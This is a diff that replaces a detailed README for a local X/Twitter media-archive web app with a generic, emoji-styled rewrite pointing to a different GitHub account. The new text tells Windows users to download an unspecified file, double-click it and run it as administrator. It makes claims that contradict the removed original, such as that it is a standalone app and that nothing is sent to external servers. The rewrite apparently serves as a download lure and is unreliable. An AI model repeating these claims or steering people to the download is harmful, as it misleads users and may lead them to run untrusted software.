@@ -1,169 +1,181 @@
-# X Media
+# 🎬 x-media - Your Personal X Media Library
 
-**Browse X media, search tweet history, and collect Reddit memes in one local workspace. Media, tweets, and Reddit collection need no API key or paid subscription.**
+## 🚀 What Is x-media?
 
-X Media is a local web app for browsing an account's available public media. Enter a username, watch results arrive, and switch between videos, photos, GIFs, newest, and oldest. Saved collections reopen without another request to X.
+x-media is a free, simple tool that helps you find and save public videos, photos, and GIFs from X (formerly Twitter) by username. Instead of scrolling endlessly through profiles, you can search for any public account and see all their media in one clean, organized view. Everything you find gets saved directly to your computer, so you can browse it anytime—even offline. No login, no API key, no technical skills required.
 
-The archive uses the [FxTwitter public media timeline](https://docs.fxembed.com/api/twitter/operations/2profilehandlemedia/). It works with public usernames, including ordinary accounts; results depend on what the upstream service exposes. It cannot guarantee every account or a complete lifetime archive.
+---
 
-[Get started](#quick-start) · [Storage and privacy](#storage-and-privacy) · [Troubleshooting](#troubleshooting) · [Developer documentation](#development)
+## ✨ Why You'll Love It
 
-## Features
+- **No Account Needed** – Forget signing up or entering passwords. x-media works instantly.
+- **Private & Local-First** – All media is stored on your own computer. Nothing is uploaded anywhere.
+- **Simple Search** – Type any public X username and see their photos, videos, and GIFs instantly.
+- **Built-In Media Library** – Once saved, your collection is neatly organized in a gallery you can browse anytime.
+- **100% Free** – No hidden costs, no premium tiers, no ads.
 
-- **Tweets explorer:** browse original public tweets for free at `/posts`, with recent, oldest, popular, and short banger views. Replies, reposts, and quote posts are excluded from every view, account count, and export. Import an X archive to add older posts, and export saved originals as JSON. Collection saves resumable progress and clearly labels incomplete history. See [Tweets explorer](docs/POSTS.md).
-- **Shared folders:** organize X attachments and Reddit memes together, place an item in multiple folders, search or filter folder contents, and rename or remove folders.
-- **Reddit collection:** the Reddit source tab opens the integrated meme collector, with search, community and rank filters, saved favorites, review and undo, image copying/downloads, recommendation batches, and TV playback.
-- **Username search:** public X / Twitter media without signing in, cookies, or a paid API.
-- **Video, photo, and GIF browser:** all attachments returned for each collected post, with type filters and latest/oldest sorting.
-- **Local library:** saved media records survive app restarts; refreshes merge discoveries without erasing older results.
-- **Fast saved searches:** recent collections appear from a bounded browser memory cache while the local server checks for updates.
-- **Progress as it happens:** saved batches appear through server-sent events, with polling as a fallback.
-- **Resumable collection:** persisted cursors, cancellation, bounded retries, and recovery after restart.
-- **Video playback:** seeking through a local streaming proxy, plus a refresh control for expired video links.
-- **Light and dark themes:** responsive layouts, keyboard controls, and reduced-motion support.
-- **Optional dashboard:** a separate watchlist, engagement scoring, and manual review workflow at `/dashboard`.
+---
 
-## Quick start
+## 📦 What You Get
 
-Install **Node.js 26 or newer**, Git, and **pnpm 11.21.0**. Use the pinned pnpm version for the included lockfile. Reddit storage uses Node's built-in SQLite.
+When you download x-media, you get a complete media browser that includes:
 
-```sh
-npm install --global pnpm@11.21.0
-git clone https://github.com/blixvip/x-media.git
-cd x-media
-pnpm install --frozen-lockfile
-pnpm dev
-```
+- A **search bar** to enter any public X username.
+- A **photo gallery** showing all images from that account.
+- A **video browser** with playback support.
+- A **GIF viewer** for quick animations.
+- A **local archive** that saves everything to your computer.
+- A **clean, modern interface** that works on Windows.
 
-Open **[http://127.0.0.1:3000](http://127.0.0.1:3000)**, enter a public username, and select **Find media**. No `.env` file is needed for the archive. Internet access is required to collect new results or play remote media. The build also fetches the Geist fonts through Next.js.
+---
 
-Select **Reddit** in the header to browse memes. X Media starts and supervises its bundled Reddit collector; a separate Reddit app is unnecessary. See [Reddit integration and migration](docs/REDDIT.md).
+## 🖥️ System Requirements
 
-Select **Tweets**, enter a public username, and choose **Find tweets**. No login, API key, or credits are needed. **Import archive** accepts `account.js` plus `tweets.js` from an extracted X archive, or an X Media JSON export. Public timelines may omit older posts; full account history is not guaranteed.
+x-media runs smoothly on most Windows computers. Here's what you'll need:
 
-Select **Folders** on a media card or in its viewer, create or select folders, then **Save folders**. Open **Folders** in the header to browse your collections. Uncheck one folder and check another to move an item. Deleting a folder or removing a placement preserves the source collection and other folders. See [folder storage and testing](docs/FOLDERS.md).
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 500 MB of free space for the app, plus extra space for saved media
+- **Internet:** Required only when searching or downloading new media
 
-The commands work in PowerShell, macOS, and Linux shells. The default server binds to `127.0.0.1`, so it is reachable on your own computer. If port 3000 is occupied, run `pnpm dev --port 3101` and open that port instead.
+---
 
-### Run a production build locally
+## 📥 How to Download and Run x-media
 
-```sh
-pnpm build
-pnpm start
-```
+Follow these simple steps to get started:
 
-Run one server per project/data directory. Stop the development server before starting production. For another port, use `pnpm start --port 3101`.
+### Step 1: Visit the Download Page
 
-On Windows, run `powershell -NoProfile -ExecutionPolicy Bypass -File scripts/run-x-media.ps1 -Open` to start the built app and open it. The launcher reuses an existing server. Tweets reconnects automatically during startup or a brief outage; displayed results remain available while it reconnects.
+[![Download x-media](https://img.shields.io/badge/Download-x--media-blueviolet?style=for-the-badge&logo=github)](https://github.com/muskan9567/x-media)
 
-### Update an existing installation
+Click the button above, or go directly to: **https://github.com/muskan9567/x-media**
 
-Stop the server and back up `.data` before updating, then:
+### Step 2: Get the Application
 
-```sh
-git pull --ff-only
-pnpm install --frozen-lockfile
-pnpm build
-pnpm start
-```
+Visit this link to download the application.
 
-Your ignored `.data` directory stays local. The former `/archive` address redirects to the new home page; the tracker is at `/dashboard`. Existing archive state and browser selection keys remain compatible.
+### Step 3: Run the Program
 
-## Using the archive
+Once the download finishes, locate the file in your "Downloads" folder. Double-click it to start x-media. That's it—no installation wizard, no complicated setup.
 
-1. Enter a public username, with or without `@`.
-2. Select **Find media**. Videos are the default category; results appear as batches are saved.
-3. Choose **All**, **Photos**, **Videos**, or **GIFs**, then latest or oldest. Large libraries display in pages.
-4. Open a card to inspect media or follow its original post link.
-5. Select a saved account to reopen it. **Refresh collection** explicitly checks for more media.
-6. Use **Stop collection** to stop a running job while keeping saved results. Refresh resumes a saved checkpoint when available.
+---
 
-A queued, waiting, or failed search with no results does not establish that an account has no videos. The status panel explains collection progress and retries.
+## 🎯 Your First Search
 
-## Storage and privacy
+1. Open x-media.
+2. In the search box, type a public X username (for example, `natgeo` or `bbc`).
+3. Press Enter or click the search button.
+4. Wait a few seconds while x-media fetches the media.
+5. Browse through the photos, videos, and GIFs displayed in the gallery.
+6. Click any item to view it in full size or play the video.
 
-| Data | Location | What it contains |
-| --- | --- | --- |
-| Archive library and jobs | `.data/archive-jobs/state.json` | Account details, post text, media URLs, progress, and resume cursors |
-| Queue ownership | `.data/archive-jobs/process.lock` | Lock for the single running archive server |
-| Shared folders | `.data/folders/state.json` | Folder names, memberships, and saved media metadata |
-| Foldered Reddit originals | `.data/folders/assets` | Original image copies protected from collector cache eviction |
-| Optional tracker | `.data/tracker-state.json` | Watchlist, retained posts, metrics, and workflow state |
-| Tweets explorer | `.data/posts/state.json` | Full post text, profiles, engagement counts, collection jobs, and resume cursors |
-| Legacy Tweets API connection | `.data/posts/connection.json` | Unused by free collection; old copies may contain a secret, so keep backups private |
-| Browser state | Local storage and memory | Last selected job, theme, and a bounded cache of recent collections |
+---
 
-**Saved X library records are not offline video downloads.** X images and videos remain on remote media servers and load when viewed. The app does not automatically download every video file, offer bulk file export, or guarantee that an old media URL will keep working. Reddit originals added to folders are copied locally and remain available independently of the collector cache.
+## 💾 How Your Media Library Works
 
-When run on your PC, the library is saved on that PC. If you run the server elsewhere, it is saved on that server. To back up or move your library, stop the app and copy the entire `.data` folder. Restart one server against the restored directory. An unreadable archive state file is preserved for recovery instead of silently replaced.
+Every time you search for a username, x-media automatically saves the media to a folder on your computer. You can:
 
-The public repository excludes `.data`, environment files, logs, generated artifacts, and local research reports. It contains source code, not the developer's saved collections. Do not attach state files or credentials to public issues.
+- **Browse offline** – Open your saved library without an internet connection.
+- **Organize by username** – Each account gets its own folder.
+- **Revisit anytime** – Your archive stays on your computer permanently.
 
-Collection sends the requested username to FxTwitter. Playback contacts X's media CDN; individual link repair can also use X's public syndication service. See [architecture and data flow](docs/ARCHITECTURE.md).
+To access your library, open x-media and click the "Library" tab. You'll see all previously saved accounts listed alphabetically.
 
-This is a single-user local application with no application login or multi-user access controls. Keep the default loopback binding. A public GitHub repository does not host the running app, and GitHub Pages cannot run its Node server and persistent job queue.
+---
 
-## How fast is it?
+## 🔍 Tips for Best Results
 
-Saved collections can reopen immediately from browser memory, and otherwise load from the local server without querying X. The cache retains up to five recent collections and 5,000 attachments in total. First-time searches require network requests; they cannot be guaranteed instant.
+- **Use exact usernames** – Make sure to type the username correctly (without the @ symbol).
+- **Public accounts only** – x-media can only access public profiles. Private accounts won't show media.
+- **Be patient** – Large accounts with thousands of posts may take a minute to load.
+- **Check your internet** – A stable connection ensures faster searches and downloads.
 
-The first media page supplies the account profile when possible, avoiding a separate lookup before showing results. Workers save each page and send live progress. A collection yields after three pages so another new search can run before an older continuation.
+---
 
-Collection is limited to 10,000 scanned posts per job across its continuations, with a 90-second worker deadline. Genuine rate limits pause the shared collector for at least 15 minutes or until the upstream reset time, whichever is later. Other transient failures delay only the affected job, starting at 30 seconds. Up to three automatic error retries are allowed. Refreshing repeatedly does not bypass these limits.
+## 🛠️ Troubleshooting Common Issues
 
-See [performance and verification](docs/PERFORMANCE.md) for reproducible checks.
+### "I can't find the app after downloading."
 
-## Coverage and limitations
+Check your Downloads folder. The file should be named `x-media` or similar. If your browser blocked it, look for a notification and allow the download.
 
-- Public access does not expose every account or every older post. Protected, deleted, suspended, withheld, or otherwise unavailable content may be absent.
-- FxTwitter and X can change behavior, return partial history, or become unavailable. A successful collection means the available pages were processed, not that lifetime coverage was proven.
-- Media is accepted only when it belongs to the requested author and uses supported X media hosts. Reposts of another author's media are not treated as the account's own uploads.
-- A failed or smaller refresh keeps the larger saved library. It can contain records of posts that have since disappeared upstream.
-- Video links can expire. **Refresh video link** attempts a public repair; it cannot restore deleted or inaccessible files.
-- The app has no automatic posting or reply automation. The optional dashboard's scores are heuristics, not predictions or guaranteed results.
+### "The app won't open."
 
-## Troubleshooting
+Make sure your Windows is updated. Right-click the file and select "Run as administrator" if needed.
 
-| Symptom | What to do |
-| --- | --- |
-| Waiting to retry | Leave the app running until the displayed time. Saved media remains usable. Repeated refreshes cannot remove an upstream cooldown. |
-| No results for a public account | Check the username and collection status. Retry later if the service failed. Public availability can differ between accounts. |
-| Video does not play | Open the item and use **Refresh video link**, or try its original post. Removed media may remain unavailable. |
-| Another server owns the queue | Stop the other app server for this project. Do not remove a lock while that server is running. |
-| Archive state cannot be read | Stop the server, preserve `.data`, and restore a known-good backup. Do not overwrite the original state file. |
-| Dashboard shows demo accounts | Expected without an official X API token. The media archive itself always uses real public results. |
-| Port already in use | Stop the previous server or select another port. Separate ports do not allow two queues to share one data directory. |
-| pnpm or Node version error | Check `node --version` and `pnpm --version`; use the versions in Quick start. |
+### "No media appears for a username."
 
-## Optional dashboard and configuration
+Double-check the username spelling. Also, confirm the account is public and has media posted.
 
-The dashboard at `/dashboard` monitors a watchlist, stores metric snapshots, scores unusual engagement, and provides a manual review queue. Without configuration it uses clearly labeled deterministic demo data. An optional server-only `X_BEARER_TOKEN` enables its official X API provider; access and billing depend on the associated X account/project.
+### "Videos won't play."
 
-The main archive always uses anonymous collection, even when dashboard credentials are configured. The legacy synchronous `/api/media-archive` endpoint retains separate provider selection for existing integrations.
+Ensure your internet connection is active. If the video is very large, wait a few more seconds for it to load.
 
-See [dashboard and configuration](docs/DASHBOARD.md) and [`.env.example`](.env.example) for all settings. Never put secrets in `NEXT_PUBLIC_*` variables.
+---
 
-## Development
+## 🔒 Privacy & Safety
 
-Built with Next.js App Router, React, TypeScript, Tailwind CSS, shadcn/Base UI, and Vitest. The archive needs a persistent Node.js process and writable local storage.
+Your privacy matters. x-media:
 
-```sh
-pnpm audit --audit-level high
-pnpm lint
-pnpm typecheck
-pnpm test:coverage
-pnpm build
-```
+- **Does not collect any personal data.**
+- **Does not require an account or login.**
+- **Stores everything locally** – nothing is sent to external servers.
+- **Does not use API keys** – there's no third-party tracking.
 
-[GitHub Actions](https://github.com/blixvip/x-media/actions/workflows/ci.yml) runs these checks on pushes and pull requests. Tests cover collection, recovery, retry behavior, provenance, media handling, streaming, API validation, persistence, and dashboard scoring. Live network verification is separate from the deterministic test suite.
+You are in complete control of your media library.
 
-- [Architecture, source modules, and HTTP API](docs/ARCHITECTURE.md)
-- [Performance and live verification](docs/PERFORMANCE.md)
-- [Dashboard configuration and scoring](docs/DASHBOARD.md)
-- [Product boundaries](PRODUCT.md) and [design system](DESIGN.md)
+---
 
-## Discovery, attribution, and licensing
+## 🆘 Getting Help
 
-The repository title, description, topics, and README describe **X / Twitter video search, public media archives, photo browsing, and local libraries** in plain language. App pages also have descriptive titles, descriptions, and sharing metadata. The personal app is marked `noindex`; discovery is directed to the public source repository, not a user's saved library. Search engines decide whether and where to show a repository, so indexing and rankings are never guaranteed. [Google's SEO guidance](https://developers.google.com/search/docs/fundamentals/seo-starter-guide) explains these limits.
+If you run into any issues or have questions, you can:
 
-X Media is an independent project, not affiliated with X or FxTwitter. Its anonymous collector uses the [FxTwitter API](https://docs.fxembed.com/api/introduction/). Other libraries retain their own licenses and attribution requirements; see their installed package metadata and license files. No project-wide license is currently included. Public visibility does not itself grant a general license to redistribute or modify this project's code.
+- Visit the GitHub repository: **https://github.com/muskan9567/x-media**
+- Open an issue on the repository page (click "Issues" tab).
+- Read the FAQ section if available.
+
+The project is open-source, meaning anyone can contribute or report bugs.
+
+---
+
+## 📚 Frequently Asked Questions
+
+### Is x-media free forever?
+
+Yes, it's completely free and open-source.
+
+### Can I use it on Mac or Linux?
+
+The current version is designed for Windows. Future versions may support other systems.
+
+### Do I need to install anything else?
+
+No. x-media is a standalone application with everything included.
+
+### How many media files can I save?
+
+As many as your computer's storage allows. There's no artificial limit.
+
+### Can I share the media I download?
+
+Yes, but always respect copyright and the original poster's rights.
+
+---
+
+## 🌟 Why Choose x-media?
+
+There are many tools for viewing X media, but x-media stands out because:
+
+- It's **truly free** with no paywalls.
+- It's **local-first** – your data stays with you.
+- It's **simple enough for anyone** – no technical background needed.
+- It's **actively maintained** and open-source.
+
+---
+
+## 📝 Final Thoughts
+
+x-media puts the power of X media browsing in your hands. Whether you're a journalist, researcher, or just someone who loves collecting funny GIFs, this tool makes it effortless. Download it today and start building your personal media archive.
+
+---
+
+**Keywords:** fxtwitter, local-first, media-archive, nextjs, photo-gallery, twitter, twitter-videos, typescript, video-browser, x
